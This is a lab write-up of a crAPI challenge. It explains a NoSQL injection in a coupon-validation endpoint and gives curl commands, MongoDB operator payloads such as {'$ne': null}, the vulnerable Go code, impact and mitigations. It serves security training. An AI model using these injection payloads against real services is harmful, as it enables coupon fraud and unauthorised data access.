# Challenge 12 — NoSQL Injection: Get free coupons without knowing the code

**OWASP API Top 10 mapping:** API8:2023 Security Misconfiguration / Injection  
**crAPI category:** NoSQL Injection

## Goal

Discover a valid coupon code without any prior knowledge, using a NoSQL injection flaw.

## Vulnerability

The community coupon validation endpoint (`POST /community/api/v2/coupon/validate-coupon`) unmarshals the request body directly into a `bson.M` map and passes it to `collection.FindOne()`. The client can therefore supply MongoDB query operators instead of a literal coupon string, matching any coupon document.

## Exploit steps

### 1. Authenticate as any user

```bash
JWT="<your-jwt>"
```

### 2. Send a NoSQL operator as the coupon code

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/community/api/v2/coupon/validate-coupon \
  -d '{"coupon_code": {"$ne": null}}' | python3 -m json.tool
```

### 3. Receive a valid coupon

```json
{
  "coupon_code": "TRAC075",
  "amount": "75",
  "CreatedAt": "2026-07-31T23:35:09.79Z"
}
```

Other useful payloads:

```json
{"coupon_code": {"$regex": ".*"}}
{"coupon_code": {"$gt": ""}}
```

### 4. Apply the coupon to increase your balance (optional)

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/apply_coupon \
  -d '{"coupon_code": "TRAC075", "amount": 75}' | python3 -m json.tool
```

## Why this works

- `ValidateCoupon` does this:
  ```go
  err = json.Unmarshal(body, &bsonMap)
  couponData, err := models.ValidateCode(s.Client, s.DB, bsonMap)
  ```
- The JSON body is converted straight into a MongoDB query filter.
- No allow-list or validation ensures that `coupon_code` is a string.
- `{"$ne": null}` matches every document whose `coupon_code` field is not null, returning the first coupon.

## Impact

- Attacker can enumerate all valid coupon codes.
- Free credits can be claimed without ever needing a real coupon.
- The same pattern can be used for authentication bypass or data exfiltration in other NoSQL-backed endpoints.

## Mitigation

- Build the MongoDB query server-side; accept only literal strings from the client and validate them.
- Use an allow-list of expected fields and reject any request that contains `$`-prefixed operators.
- Do not pass raw user JSON directly into a database query filter.
- Use a typed DTO before constructing the BSON query.
